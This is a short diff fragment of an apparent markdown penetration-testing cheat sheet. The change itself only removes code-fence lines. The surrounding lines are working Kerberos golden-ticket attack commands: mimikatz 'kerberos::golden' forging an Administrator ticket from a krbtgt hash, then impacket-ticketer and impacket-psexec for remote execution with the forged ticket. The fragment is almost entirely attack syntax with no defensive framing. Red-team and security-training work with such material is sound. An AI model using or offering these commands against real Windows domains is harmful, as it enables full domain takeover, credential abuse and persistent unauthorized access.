@@ -107,9 +107,7 @@ kerberos::golden /user:Administrator /domain:DOMAIN /sid:SID /krbtgt:KRBTGT_NTLM
 
 # open a new elevated command prompt with the given ticket in mimikatz.
 misc::cmd
-```
 
-```bash
 impacket-ticketer -nthash KRBTGT_NTLM_HASH -domain-sid DOMAIN_SID -domain FQDN_DOMAIN USER
 export KRB5CCNAME=FILE.cache
 impacket-psexec DOMAIN/USER@DOMAIN -k -no-pass
